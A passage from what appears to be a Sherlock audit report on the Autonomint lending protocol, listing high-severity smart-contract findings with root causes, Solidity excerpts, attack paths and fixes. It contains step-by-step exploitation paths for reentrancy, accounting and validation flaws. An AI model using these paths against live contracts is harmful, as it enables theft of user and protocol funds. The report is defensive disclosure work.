2. User is liquidated via `borrowLiquidation::liquidationType1()`, adding USDa from liquidation.
3. Another user can deposit and withdraw from `borrowing.sol` and steal these USDa, even using a flashloan if necessary.

### Impact

Abond holders suffer losses.

### PoC

None.

### Mitigation

Add a cumulative tracking variable to handle this case.

# Issue H-23: `CDSLib::withdrawUserWhoNotOptedForLiq()` tax is not stored in the treasury 

Source: https://github.com/sherlock-audit/2024-11-autonomint-judging/issues/829 

## Found by 
0x37, 0x73696d616f, Audinarey, almurhasan, onthehunt

### Summary

`CDSLib::withdrawUserWhoNotOptedForLiq()` does [not](https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/lib/CDSLib.sol#L891) store the tax from the cds depositor profit, leaving these funds stuck. It must call `Treasury::updateUsdaCollectedFromCdsWithdraw()`, similarly to what is done [when](https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/lib/CDSLib.sol#L803) the user opts in for liquidation.

### Root Cause

In `CDSLib::withdrawUserWhoNotOptedForLiq()`, the profit tax is not stored in the treasury.

### Internal pre-conditions

None.

### External pre-conditions

None.

### Attack Path

1. Cds depositor who did not opt in for liquidation withdraws, and the profit tax to the protocol is not stored and gets stuck.

### Impact

Stuck funds.

### PoC

None.

### Mitigation

Call `Treasury::updateUsdaCollectedFromCdsWithdraw()` on the profit.

# Issue H-24: Cross-Contract Reentrancy Vulnerability in CDS Withdraw Function 

Source: https://github.com/sherlock-audit/2024-11-autonomint-judging/issues/832 

## Found by 
t.aksoy, valuevalk

### Summary

The withdraw function in the CDS contract is vulnerable to cross-contract reentrancy attacks due to delayed updates to the omniChainData global state. During execution, funds are transferred to the user via a low-level `.call `function, granting control to the user before `omniChainData` is updated. A malicious user could exploit this by calling borrowing contract and altering the global omniChainData state. This results in the outdated in-memory omniChainData being used to overwrite the updated global state at the end of the transaction, breaking calculations and potentially preventing user withdrawals from borrowing contract.

### Root Cause

In the CDS withdraw function, the omniChainData is fetched and stored in memory at the beginning of the transaction. This data is subsequently updated in the global state only after all operations are complete. During the execution of the withdraw function, if the user opts for liquidation gains, the function transfers ETH to the user using the .call function. This grants control to the user mid-execution.

A malicious user can exploit this control to interact with borrowing contract, modifying the global omniChainData state. However, at the end of the withdraw function, the outdated in-memory omniChainData is written back to the global state, overwriting any legitimate changes made during the reentrant call.

```solidity
function withdraw(
    uint64 index,
    uint256 excessProfitCumulativeValue,
    uint256 nonce,
    bytes memory signature
) external payable nonReentrant whenNotPaused(IMultiSign.Functions(5)) {
    // Step 1: Fetch omniChainData in memory
    IGlobalVariables.OmniChainData memory omniChainData = globalVariables.getOmniChainData();
    // Perform calculations and updates using in-memory omniChainData
   withdrawResult = CDSLib.withdrawUser(
              WithdrawUserParams(cdsDepositDetails,
                omniChainData, ...));

    // Step 4: Update global state, overwriting changes made during reentrancy
     globalVariables.setOmniChainData(withdrawResult.omniChainData); // @audit outdated data overwrites updates
}

 function withdrawUser(
    ) public returns (CDSInterface.WithdrawResult memory) {
        if (!params.cdsDepositDetails.optedLiquidation) {
        } else {
                

               //  Step 2: Transfer liquidation gains to user from treasury
                if (params.ethAmount != 0) {
                    params.omniChainData.collateralProfitsOfLiquidators -= totalWithdrawCollateralAmountInETH;
                    // Call transferEthToCdsLiquidators to tranfer eth
                    interfaces.treasury.transferEthToCdsLiquidators(
                        msg.sender,
                        params.ethAmount
                    );
                }

}
}

    function transferEthToCdsLiquidators(
        address user,
        uint128 amount
    ) external onlyCoreContracts {
  
        //  Step 3: Transfer ETH, control transferred to user
        (bool sent, ) = payable(user).call{value: amount}("");
        if (!sent) revert Treasury_EthTransferToCdsLiquidatorFailed();
    }

```

https://github.com/sherlock-audit/2024-11-autonomint/blob/0d324e04d4c0ca306e1ae4d4c65f0cb9d681751b/Blockchain/Blockchian/contracts/Core_logic/CDS.sol#L399

https://github.com/sherlock-audit/2024-11-autonomint/blob/0d324e04d4c0ca306e1ae4d4c65f0cb9d681751b/Blockchain/Blockchian/contracts/lib/CDSLib.sol#L828

### Internal pre-conditions

1. Malious user deposit to CDS contract with an custom contract that implements  fallback function
2. Liquidation gains should include ETH amount 
3. Malious user should be able to claim ETH when withdrawing from CDS

### External pre-conditions

_No response_

### Attack Path

1. User Calls CDS withdraw
- omniChainData is fetched and stored in memory.
2. Malicious User Gains Control via .call:
- During the execution of withdraw, if the user has opted for liquidation gains, the function attempts to transfer ETH to the user via .call.
3. Malicious User Modifies omniChainData via Borrowing Contract
- While holding control, the malicious user interacts with the borrowing contract and deposits a large amount (X) to manipulate the global omniChainData.
- This action updates the global omniChainData, specifically increasing totalVolumeOfBorrowersAmountinWei.
5. Outdated omniChainData Overwrites Updates:
-  After the control is returned to the withdraw function, it proceeds to write back the outdated in-memory omniChainData to the global state.
- Changes made to omnichainData in the borrowing contract are overwritten, causing incorrect state updates.
6. Malicious User Withdraws from Borrowing Contract
- After the withdraw function completes, the malicious user interacts with the borrowing contract again and withdraws the previously deposited amount (X).
- This action reduces totalVolumeOfBorrowersAmountinWei in the global omniChainData to a value lower than it should be, due to the overwritten state.
8. If the malicious user repeats this attack multiple times with high X values `totalVolumeOfBorrowersAmountinWei` becomes artificially low preventing users withdrawal from borrowing the contract









### Impact

Incorrect omniChainData values disrupt critical calculations, such as the CDS pool-to-ETH ratio, cumulative values
Withdrawal operations in borrowing contract may fail due to invalid state variables.

### PoC

_No response_

### Mitigation

Adhere to the checks-effects-interactions pattern. 
Update the global state (omniChainData) before transferring control to the user.


# Issue H-25: Logical Error in Timestamp Condition for Option Renewal `BorrowLib.getOptionFeesToPay()` 

Source: https://github.com/sherlock-audit/2024-11-autonomint-judging/issues/834 

## Found by 
0xAadi, 0xAristos, 0xundiscover, Audinarey, KungFuPanda, LordAlive, ParthMandale, futureHack, itcruiser00, nuthan2x, smartkelvin, tedox, theweb3mechanic, tjonair, valuevalk, volodya, wellbyt3, xKeywordx

### Summary

A logical error exists in the `BorrowLib.getOptionFeesToPay()` function's timestamp condition, which is intended to enforce a renewal window for options. The current implementation uses a logical AND (&&) that results in an impossible condition, potentially leading impossible eligibility check to renew position for users.



### Root Cause

The issue is found in the following code snippet within the `getOptionFeesToPay()` function:

```solidity
            // check the user is eligible to renew position
            if (
                block.timestamp <
@>              depositDetail.optionsRenewedTimeStamp + 15 days &&
                block.timestamp >
                depositDetail.optionsRenewedTimeStamp + 30 days
            ) revert IBorrowing.Borrow_DeadlinePassed();
```
https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/lib/BorrowLib.sol#L445C1-L451C57

The condition uses a logical AND (&&), requiring the timestamp to be both less than 15 days and more than 30 days after `optionsRenewedTimeStamp`, which is logically impossible.

This results in the condition never being true, potentially allowing renewals outside the intended window.


### Internal pre-conditions

_No response_

### External pre-conditions

_No response_

### Attack Path

1. The attacker calls the `renewOptions()` function at any time, regardless of the intended renewal window.
2. Due to the logical AND (&&) condition, the check for the renewal window never triggers a revert, as no timestamp can satisfy both conditions simultaneously.
3. The attacker successfully renews the options outside the intended 15 to 30-day window.

### Impact

The intended enforcement of a renewal window is not functioning as expected, allowing renewals at any time. This could lead to unauthorized renewals.

### PoC

_No response_

### Mitigation

Change the condition to use a logical OR (||) to correctly enforce the renewal window:

```diff
            // check the user is eligible to renew position
            if (
                block.timestamp <
-               depositDetail.optionsRenewedTimeStamp + 15 days &&
+               depositDetail.optionsRenewedTimeStamp + 15 days ||
                block.timestamp >
                depositDetail.optionsRenewedTimeStamp + 30 days
            ) revert IBorrowing.Borrow_DeadlinePassed();
```

# Issue H-26: Using LayerZero for synchronizing global states between two chains may lead to overwriting of global states. 

Source: https://github.com/sherlock-audit/2024-11-autonomint-judging/issues/848 

## Found by 
0x37, 0x73696d616f, 0xNirix, EgisSecurity, LZ\_security, santiellena, valuevalk

### Summary

Due to the lack of a locking mechanism and the non-atomic nature of cross-chain operations, global states may be at risk of being overwritten.

### Root Cause

https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/Core_logic/GlobalVariables.sol#L43
In both Optimism and Mode, there is a global variable omniChainData, which contains numerous data items as follows:
```javascript
struct OmniChainData {
        uint256 normalizedAmount;
        uint256 vaultValue;
        uint256 cdsPoolValue;
        uint256 totalCDSPool;
        uint256 collateralRemainingInWithdraw;
        uint256 collateralValueRemainingInWithdraw;
        uint128 noOfLiquidations;
        uint64 nonce;
        uint64 cdsCount;
        uint256 totalCdsDepositedAmount;
        uint256 totalCdsDepositedAmountWithOptionFees;
        uint256 totalAvailableLiquidationAmount;
        uint256 usdtAmountDepositedTillNow;
        uint256 burnedUSDaInRedeem;
        uint128 lastCumulativeRate;
        uint256 totalVolumeOfBorrowersAmountinWei;
        uint256 totalVolumeOfBorrowersAmountinUSD;
        uint128 noOfBorrowers;
        uint256 totalInterest;
        uint256 abondUSDaPool;
        uint256 collateralProfitsOfLiquidators;
        uint256 usdaGainedFromLiquidation;
        uint256 totalInterestFromLiquidation;
        uint256 interestFromExternalProtocolDuringLiquidation;
        uint256 totalNoOfDepositIndices;
        uint256 totalVolumeOfBorrowersAmountLiquidatedInWei;
        uint128 cumulativeValue; // cumulative value
        bool cumulativeValueSign; // cumulative value sign whether its positive or not negative
        uint256 downsideProtected;
    }
```

The design of this protocol ensures that any changes to omniChainData on one chain are synchronized to other chains via Layer_Zero.

However, due to the lack of a locking mechanism and the non-atomic nature of cross-chain operations, this could lead to overwriting of global states. The following is a simple explanation using a borrow example:
	1.	Alice deposits 1 ETH on Optimism, and almost simultaneously, Bob deposits 100 ETH on the Mode chain.
	2.	The totalVolumeOfBorrowersAmountinWei on Optimism becomes 1e18, while on the Mode chain, it becomes 100 * 1e18.
	3.	Both Optimism and Mode chains send globalVariables.send to synchronize their local data to the other chain.
	4.	As a result, totalVolumeOfBorrowersAmountinWei on Optimism becomes 100 * 1e18, while on the Mode chain, it becomes 1e18.

Both chains now hold incorrect totalVolumeOfBorrowersAmountinWei values. The correct value should be 101 * 1e18.

The fundamental issue is that when Alice deposits on Optimism, the cross-chain synchronization to the Mode chain cannot prevent users from performing nearly simultaneous actions on the Mode chain, leading to overwriting of global states.

Furthermore, there could also be scenarios where a message is successfully sent via Layer_Zero on Optimism but encounters an error when executing receive() on the Mode chain, leading to additional inconsistencies.

### Internal pre-conditions

_No response_

### External pre-conditions

_No response_

### Attack Path

_No response_

### Impact

Errors in global accounting data can lead to incorrect calculations in critical system processes.


### PoC

_No response_

### Mitigation

Modify and improve the relevant data synchronization mechanism.

# Issue H-27: Borrower deposit, withdraw, deposit will reinit `omniChainData.cdsPoolValue`, getting profit stuck for cds depositors 

Source: https://github.com/sherlock-audit/2024-11-autonomint-judging/issues/919 

## Found by 
0x73696d616f

### Summary

[BorrowLib::calculateRatio()](https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/lib/BorrowLib.sol#L156) sets `omniChainData.cdsPoolValue` to `previousData.totalCDSPool + netPLCdsPool`, disregarding any past value of `omniChainData.cdsPoolValue`, when the `noOfDeposits` is null.
`noOfDeposits` is `omniChainData.totalNoOfDepositIndices`, which is increased and decrease on borrower deposit and withdraw, respectively. Hence, it's possible to make it null again while still having cds depositors and positive long contributions to `omniChainData.cdsPoolValue`.

### Root Cause

In `BorrowLib:199`, `omniChainData.cdsPoolValue` is overwritten.

### Internal pre-conditions

None.

### External pre-conditions

None.

### Attack Path

1. Consider a cds depositor of 1000 USDa and a ETH price of 1000 USD / ETH.
2. Borrower deposits 1 ETH and borrows 800 USDa (consider no option fees). Strike price is 1050 USD / ETH.
3. Price goes up to 1050 USD / ETH.
4. Consider that no interest on the debt accrued and the borrower withdraws. `omniChainData.cdsPoolValue` will increase to `1000 + 1 * (1050 - 1000) = 1050`. The cumulative value in cds is [updated](https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/lib/BorrowLib.sol#L930-L933), adding `1 * (1050 - 1000) / 1000 = 0.05`. 
5. Another borrower comes in, deposits 1 wei of ETH. Note that it will [calculate](https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/lib/BorrowLib.sol#L661) the ratio, and `omniChainData.totalNoOfDepositIndices` is 0 now. So, `previousData.cdsPoolValue = currentCDSPoolValue;` is set, and `currentCDSPoolValue = previousData.totalCDSPool + netPLCdsPool = 1000 + 0 = 1000`. `netPLCdsPool == 0` because the price is 1050 now and has not changed.
6. Cds depositor withdraws (ignore 1 wei borrow, it's irrelevant), with a profit of `1000 * 0.05 = 50` USD, but `previousData.cdsPoolValue` is 1000 USD, as the cds depositor tries to withdraw 1050 USD, it [underflows](https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/Core_logic/CDS.sol#L395).

### Impact

Cds depositor can not withdraw 50 USDa profit (and whole deposit, until someone else deposits cds and this user steals cds from the next depositor).

### PoC

See above explanation.

### Mitigation

Consider track if there is pending net cds pool.

# Issue H-28: Missing Update to `omnichain.totalAvailableLiquidationAmount` in `withdrawUser` 

Source: https://github.com/sherlock-audit/2024-11-autonomint-judging/issues/930 

## Found by 
0x37, 0x73696d616f, Cybrid, Waydou, volodya

### Summary

In the [`deposit`](https://github.com/sherlock-audit/2024-11-autonomint/blob/0d324e04d4c0ca306e1ae4d4c65f0cb9d681751b/Blockchain/Blockchian/contracts/lib/CDSLib.sol#L546) function we update `omnichain.totalAvailableLiquidationAmount` based on the enw deposit, however The [`Withdraw`](https://github.com/sherlock-audit/2024-11-autonomint/blob/0d324e04d4c0ca306e1ae4d4c65f0cb9d681751b/Blockchain/Blockchian/contracts/lib/CDSLib.sol#L609) function processes user withdrawals but fails to update the `omnichain.totalAvailableLiquidationAmount.` This omission creates a discrepancy between the protocol's actual liquidation capacity and the recorded available amount. While the deposit function correctly adjusts this value, the absence of an update during withdrawals leads to an inflated `totalAvailableLiquidationAmount,` potentially allowing the protocol to overcommit its liquidation resources.


### Root Cause

1. The `withdrawUser` function processes user withdrawals without adjusting the `omnichain.totalAvailableLiquidationAmount` to reflect the reduced CDS pool.
2. The `deposit` function, in contrast, correctly updates this value when users contribute to the CDS pool.


### Internal pre-conditions

_No response_

### External pre-conditions

_No response_

### Attack Path

1. A user withdraws their CDS funds, but the protocol does not update omnichain.totalAvailableLiquidationAmount.
2. During liquidation, the protocol calculates user shares based on the inflated value.
3. The overestimated `totalAvailableLiquidationAmount` causes some liquidation gains to remain undistributed, locking funds in the protocol.

### Impact

1. A portion of liquidation gains remains locked in the CDS pool, reducing the funds distributed to eligible users.
2. Remaining CDS participants receive a smaller share of the liquidation gains than they are entitled to.


### PoC

1. State Before Withdrawal:
- omnichain.totalAvailableLiquidationAmount = 1,000,000 USDa.
- User withdraws 200,000 USDa.
2. Expected Behavior:
- omnichain.totalAvailableLiquidationAmount is reduced to 800,000 USDa.
3. Actual Behavior:
- omnichain.totalAvailableLiquidationAmount remains 1,000,000 USDa.
4. During Liquidation:
- Assume liquidation generates 500,000 USDa in gains.
- Share calculation uses the inflated 1,000,000 USDa instead of the actual 800,000 USDa.
- 100,000 USDa of the gains remains locked due to the overestimated pool size.

### Mitigation

```javascript
params.omniChainData.totalAvailableLiquidationAmount -= params.cdsDepositDetails.withdrawedAmount;
```
I should note there seems to be no update on omnichain, this should be looked at

# Issue H-29: Liquidation will reduce total cds deposited amount, leading to incorrect option fees 

Source: https://github.com/sherlock-audit/2024-11-autonomint-judging/issues/993 

## Found by 
0x73696d616f

### Summary

`borrowLiquidation::liquidationType1()` [reduces](https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/Core_logic/borrowLiquidation.sol#L248) `omniChainData.totalCdsDepositedAmount`, so the option fees will be calculated on this reduced total cds depositors, but the normalized deposit of each borrower still amounts to their initial value, overcharging option fees.

### Root Cause

In `borrowLiquidation:248`, the `omniChainData.totalCdsDepositedAmount` is reduced, but the option fees normalized deposits are not accounted for.

### Internal pre-conditions

None.

### External pre-conditions

None.

### Attack Path

1. ETH price is 1000 USD / ETH.
2. Cds depositor deposits 1000 USDa.
3. Borrower deposits 1 ETH and borrows 800 USDa. Assume no option fees are charged.
4. Price drops to 800 USD / ETH.

At this point, the total normalized amount of the cds depositor is 1000 (1000 USda divided by 1 rate).
6. Borrower is liquidated and `omniChainData.totalCdsDepositedAmount` becomes `360` (`1000 - (800 + 20 - 180)`, where 800 is the debt, 20 is the amount to return to abond and 180 is the cds profits).
7. New borrower deposits and pays 50 USD option fees. [CDS::calculateCumulativeRate()](https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/lib/CDSLib.sol#L163) calculates `percentageChange` as `50 / 360`. The new rate becomes `1 * (1 + 50 / 360) = 1.1389`.
8. Borrower withdraws.
9. Cds depositor withdraws, getting from option fees `1000 * 1.1389 - 1000 = 138.9`, way more than it should.

### Impact

Cds depositor gets much more option fees than it should.

### PoC

See above.

### Mitigation

Adjust the cumulative rate when reducing the cds deposited amount with option fees or similar.

# Issue H-30: In the Liquidation Type 1 process, Ether refunds are being sent to an incorrect recipient address 

Source: https://github.com/sherlock-audit/2024-11-autonomint-judging/issues/998 

## Found by 
0x23r0, 0xAristos, Audinarey, AuditorPraise, Aymen0909, DenTonylifer, Flashloan44, John44, LZ\_security, Ocean\_Sky, RampageAudit, nuthan2x, santiellena, super\_jack, t.aksoy, theweb3mechanic, valuevalk, volodya, wellbyt3

### Summary

In the Liquidation Type 1 process, Ether refunds are being sent to an incorrect [recipient address](https://github.com/sherlock-audit/2024-11-autonomint-bluenights004/blob/main/Blockchain/Blockchian/contracts/Core_logic/borrowLiquidation.sol#L303). Specifically, refunds should be directed to the admin user, who acts as the liquidation operator and is the legitimate recipient. However, the current implementation mistakenly sends the refund to the borrower’s address.

```Solidity
File: borrowLiquidation.sol
302:         if (liqAmountToGetFromOtherChain == 0) {
303:             (bool sent, ) = payable(user).call{value: msg.value}(""); //@note wrong address 
304:             require(sent, "Failed to send Ether");
305:         }
```

### Root Cause

When liqAmountToGetFromOtherChain is zero or cross-chain operations are unnecessary, the Ether refund is incorrectly sent to the borrower’s address instead of the admin’s address. This misdirection can result in the admin losing funds that should rightfully be refunded to them.

### Internal pre-conditions

_No response_

### External pre-conditions

_No response_

### Attack Path

Here is the scenario
1. Execution of Liquidation Type 1: A loan is liquidated using Liquidation Type 1.
2. Zero Cross-Chain Amount: In this liquidation, liqAmountToGetFromOtherChain is zero, indicating that no Ether is needed for cross-chain operations.
3. Refund Process: Ether is intended to be refunded to the liquidator, which is the admin.
4. Incorrect Recipient Address: Due to a flaw in the code, the refund is mistakenly sent to the borrower’s address instead of the admin’s address.
5. Loss of Funds: As a result, the admin loses the funds that should have been refunded.

### Impact

The admin, who is responsible for executing the Liquidation Type 1 process, loses Ether refunds that should be rightfully sent to them. 

### PoC

see attack path

### Mitigation

Update the recipient address in the refund logic to the admin’s address.

# Issue H-31: Unintended Downside Protection Exploitation in Borrowing Withdrawal Mechanism 

Source: https://github.com/sherlock-audit/2024-11-autonomint-judging/issues/999 

## Found by 
0x37, 0xbakeng, LordAlive, ParthMandale, PeterSR, futureHack, gss1, influenz, onthehunt, pashap9990, santiellena, valuevalk, volodya, wellbyt3, zatoichi0826

### Summary

A significant vulnerability exists in the protocol's downside protection mechanism where borrowers can receive protection benefits during withdrawal even after their options have expired. While the system is designed to provide downside protection for the initial 30-day maturity period in exchange for an option fee, the current implementation fails to properly validate the maturity timeline during withdrawals.

### Root Cause

No check implementation is done for checking if the borrower's `depositDetail.optionsRenewedTimeStamp` time comes under maturity time from the current time (block.timestamp)
Even if the borrower has not even renewed options for more than 30 days maturity time then also he will get downside protection from the protocol, and that's the ISSUE as the 
protocol will have to take loss because user will pay back the protocol less debt amount than intended. 

[Here](https://github.com/sherlock-audit/2024-11-autonomint/blob/0d324e04d4c0ca306e1ae4d4c65f0cb9d681751b/Blockchain/Blockchian/contracts/lib/BorrowLib.sol#L826) 
Calculation happening for borrower's downside protection (even if he is not in options maturity, because of lack of check):

```solidity
            uint128 downsideProtected = calculateDownsideProtected(
                depositDetail.depositedAmountInETH, params.ethPrice, depositDetail.ethPriceAtDeposit
            );
```

[Next](https://github.com/sherlock-audit/2024-11-autonomint/blob/0d324e04d4c0ca306e1ae4d4c65f0cb9d681751b/Blockchain/Blockchian/contracts/lib/BorrowLib.sol#L840) 
Total Debt Amount to pay back is getting subtracted with that calculated downside protection amount, and user is paying less than indended to protocol. Ultimatly here Protocol will suffer.

```solidity
depositDetail.totalDebtAmountPaid = borrowerDebt - downsideProtected;
``` 

### Internal pre-conditions

Downside protection is calculated to a positive number when the provided asset in eth price at the time of deposit was more than the price of current eth price.
ie. when the collateral price is fallen below.

### External pre-conditions

_No response_

### Attack Path

. Borrower initiates a loan position
2. Deliberately waits for an extended period (e.g., one year) without renewing options
3. Executes withdrawal after significant price movements
4. Receives unauthorized downside protection benefits
5. Repays reduced debt amount despite expired protection

### Impact

The vulnerability creates a substantial financial risk for the protocol as it allows borrowers to unfairly benefit from expired protection mechanisms. This results in:
- Unauthorized reduction in debt repayments
- Protocol financial losses
- Exploitation of price movements without valid option coverage

### PoC

_No response_

### Mitigation

Implement strict validation of option maturity during withdrawal:
- Add timestamp verification for `depositDetail.optionsRenewedTimeStamp`
- Only apply downside protection for positions within valid maturity periods
- Require full debt repayment for expired options

# Issue H-32: The user overpays the USDA amount for downside protection while withdrawing 

Source: https://github.com/sherlock-audit/2024-11-autonomint-judging/issues/1004 

## Found by 
0x37, 0x73696d616f, John44, LordAlive, Pablo, ParthMandale, PeterSR, Ruhum, futureHack, jah, nuthan2x, t.aksoy

## Summary

The protocol provides >= 20% downside protection on the collateral depending on the volatility of collateral. However, users should pay USDA amount for downside protection, while withdrawing and protocol doesn't cover downside protection.
## Root Cause

In the [BorrowLib.sol](https://github.com/sherlock-audit/2024-11-autonomint/blob/0d324e04d4c0ca306e1ae4d4c65f0cb9d681751b/Blockchain/Blockchian/contracts/lib/BorrowLib.sol#L867) `withdraw()` function, users return usda and receive collateral. Although protocol covers 20% downside protection, users should return amount of `downsideProtected`.

Let's see line 867 and line 878, and calculate total usda amount users should hold: burnValue + (borrowerDebt - depositDetail.borrowedAmount) + discountedCollateral = depositDetail.borrowedAmount - discountedCollateral + (borrowerDebt - depositDetail.borrowedAmount) + discountedCollateral = borrowerDebt.

As result, users should return full debt(borrowerDebt) and the protocol doesn't cover `downsideProtected`.

```solidity
    function withdraw(
        ITreasury.DepositDetails memory depositDetail,
        IBorrowing.BorrowWithdraw_Params memory params,
        IBorrowing.Interfaces memory interfaces
    ) external returns (IBorrowing.BorrowWithdraw_Result memory) {

        ...

        // Calculate the USDa to burn
867     uint256 burnValue = depositDetail.borrowedAmount - discountedCollateral;

        // Burn the USDa from the Borrower
        bool success = interfaces.usda.burnFromUser(msg.sender, burnValue);
        if (!success) revert IBorrowing.Borrow_BurnFailed();

        ...

        //Transfer the remaining USDa to the treasury
878     bool transfer = interfaces.usda.transferFrom(
            msg.sender,
            address(interfaces.treasury),
            (borrowerDebt - depositDetail.borrowedAmount) + discountedCollateral
        );
        if (!transfer) revert IBorrowing.Borrow_USDaTransferFailed();
        ...
    }
```


## Internal pre-conditions

## External pre-conditions

## Attack Path

## Impact

Users should return usda amount for downside protection and the protocol doesn't cover downside protection.

## Mitigation

Deduct downside protection.

```diff
    function withdraw(
        ITreasury.DepositDetails memory depositDetail,
        IBorrowing.BorrowWithdraw_Params memory params,
        IBorrowing.Interfaces memory interfaces
    ) external returns (IBorrowing.BorrowWithdraw_Result memory) {

        ...

        // Calculate the USDa to burn
        uint256 burnValue = depositDetail.borrowedAmount - discountedCollateral;

        // Burn the USDa from the Borrower
        bool success = interfaces.usda.burnFromUser(msg.sender, burnValue);
        if (!success) revert IBorrowing.Borrow_BurnFailed();

        ...

        //Transfer the remaining USDa to the treasury
        bool transfer = interfaces.usda.transferFrom(
            msg.sender,
            address(interfaces.treasury),
-           (borrowerDebt - depositDetail.borrowedAmount) + discountedCollateral
+           (borrowerDebt - depositDetail.borrowedAmount - downsideProtected) + discountedCollateral
        );
        if (!transfer) revert IBorrowing.Borrow_USDaTransferFailed();
        ...
    }
```

# Issue H-33: `totalCdsDepositedAmountWithOptionFees` is incorrectly reduced in `CDSLib::withdrawUser()`, leading to stuck option fees 

Source: https://github.com/sherlock-audit/2024-11-autonomint-judging/issues/1019 

## Found by 
0x73696d616f, 0xe4669da, John44, almurhasan

### Summary

`totalCdsDepositedAmountWithOptionFees` in `CDSLib::withdrawUser()` is [reduced](https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/lib/CDSLib.sol#L731) by:
```solidity
totalCdsDepositedAmountWithOptionFees -= (params.cdsDepositDetails.depositedAmount - params.cdsDepositDetails.liquidationAmount + params.optionsFeesToGetFromOtherChain);
```
This is incorrect as the correct amount to reduce in option fees is `params.optionFees - params.optionsFeesToGetFromOtherChain`, not `optionsFeesToGetFromOtherChain` in this chain. As such, depending on the cds amounts of each chain, it will lead to too many/little option fees registered in the local chain, which will lead to stuck option fees.### 

### Root Cause

In `CDSLib.sol:731`, `totalCdsDepositedAmountWithOptionFees` is reduced by the incorrect amount.

### Internal pre-conditions

None.

### External pre-conditions

None.

### Attack Path

1. Cds depositor withdraws, having option fees, in which `params.optionsFeesToGetFromOtherChain` is null. Suppose a liquidation happened of 500, deposited amount is 1000 and options fees are 50, the resulting `totalCdsDepositedAmountWithOptionFees` is :
```solidity
totalCdsDepositedAmountWithOptionFees -= (params.cdsDepositDetails.depositedAmount - params.cdsDepositDetails.liquidationAmount + params.optionsFeesToGetFromOtherChain); = 550 - (1000 - 500 + 0) = 50
```
Note: for simplicity, it was assumed that the liquidation that happened reduced `totalCdsDepositedAmountWithOptionFees` by 500, which is not precise but it's an okay approximation for this example.
The user withdraws the option fees, but the CDS contract still has the 50 option fees stored in `totalCdsDepositedAmountWithOptionFees`, even though it is not actually backed.


### Impact

As `totalCdsDepositedAmountWithOptionFees` is 50, but the global `totalCdsDepositedAmountWithOptionFees` is null (it was correctly decreased), it will lead to incorrect calculations when getting the option fees [proportions](https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/lib/CDSLib.sol#L62). For example, if someone deposits 1000 cds and another user deposits borrows (suppose it pays more 50 USD), it will add option fees on deposit. Then, when the borrower withdraws and the cds depositor withdraws, `getOptionsFeesProportions()` will calculate `totalOptionFeesInOtherChain` as `1050 - 1100`, which underflows.

### PoC

See above.

### Mitigation

The correct code is:
```solidity
totalCdsDepositedAmountWithOptionFees -= (params.cdsDepositDetails.depositedAmount - params.cdsDepositDetails.liquidationAmount + (params.optionFees - params.optionsFeesToGetFromOtherChain));
```

# Issue H-34: Wrong state update in `liquidationType1` call 

Source: https://github.com/sherlock-audit/2024-11-autonomint-judging/issues/1021 

## Found by 
0x37, CL001, Cybrid, Laksmana, LordAlive, OrangeSantra, ParthMandale, almurhasan, elolpuer, futureHack, nuthan2x, santiellena, valuevalk, wellbyt3

### Summary


Not updating `usdaGainedFromLiquidation` state on `liquidationType1` instead `abondUSDaPool` is being updated.
This will make `abond usda ratio from liquidation` always == 0. And yields will never be increased/decreased.
Instead, yield from liquidation is sent to `abondUSDaPool`


### Root Cause



`updateAbondUSDaPool` call instead of `updateUSDaGainedFromLiquidation(usdaToTransfer, true)` on [liquidationType1]()




### Internal pre-conditions

_No response_

### External pre-conditions

_No response_

### Attack Path


The `usdaToAbondRatioLiq` accounting in `redeemYields` will always be 0, because `treasury.usdaGainedFromLiquidation()` will always return 0. Because in `liquidationType1`, `treasury.updateAbondUSDaPool` is called instead of `treasury.updateUSDaGainedFromLiquidation(usdaToTransfer, true)`

[borrowLiquidation.liquidationType1](https://github.com/sherlock-audit/2024-11-autonomint/blob/0d324e04d4c0ca306e1ae4d4c65f0cb9d681751b/Blockchain/Blockchian/contracts/Core_logic/borrowLiquidation.sol#L208-L210)
[BorrowLib.redeemYields](https://github.com/sherlock-audit/2024-11-autonomint/blob/0d324e04d4c0ca306e1ae4d4c65f0cb9d681751b/Blockchain/Blockchian/contracts/lib/BorrowLib.sol#L1001-L1005)
[Treasury.updateAbondUSDaPool](https://github.com/sherlock-audit/2024-11-autonomint/blob/0d324e04d4c0ca306e1ae4d4c65f0cb9d681751b/Blockchain/Blockchian/contracts/Core_logic/Treasury.sol#L405)
[Treasury.updateUSDaGainedFromLiquidation](https://github.com/sherlock-audit/2024-11-autonomint/blob/0d324e04d4c0ca306e1ae4d4c65f0cb9d681751b/Blockchain/Blockchian/contracts/Core_logic/Treasury.sol#L422)


```solidity
    function liquidationType1(
        address user,
        uint64 index,
        uint64 currentEthPrice,
        uint256 lastCumulativeRate
    ) internal returns (CDSInterface.LiquidationInfo memory liquidationInfo) {
//////////////////////////////////////
/////////////////////////////////////
        // Calculate borrower's debt
        uint256 borrowerDebt = ((depositDetail.normalizedAmount * lastCumulativeRate) / BorrowLib.RATE_PRECISION);
        uint128 returnToTreasury = uint128(borrowerDebt);

        // 20% to abond usda pool 
        uint128 returnToAbond = BorrowLib.calculateReturnToAbond(depositDetail.depositedAmountInETH, depositDetail.ethPriceAtDeposit, returnToTreasury);
    @>  treasury.updateAbondUSDaPool(returnToAbond, true); 

//////////////////////////////////////
/////////////////////////////////////
    }


    function redeemYields(
        address user,
        uint128 aBondAmount,
        address usdaAddress,
        address abondAddress,
        address treasuryAddress,
        address borrow
    ) public returns (uint256) {
        // check abond amount is non zewro
        if (aBondAmount == 0) revert IBorrowing.Borrow_NeedsMoreThanZero();
        IABONDToken abond = IABONDToken(abondAddress);
        // get user abond state
        State memory userState = abond.userStates(user);
        // check user have enough abond
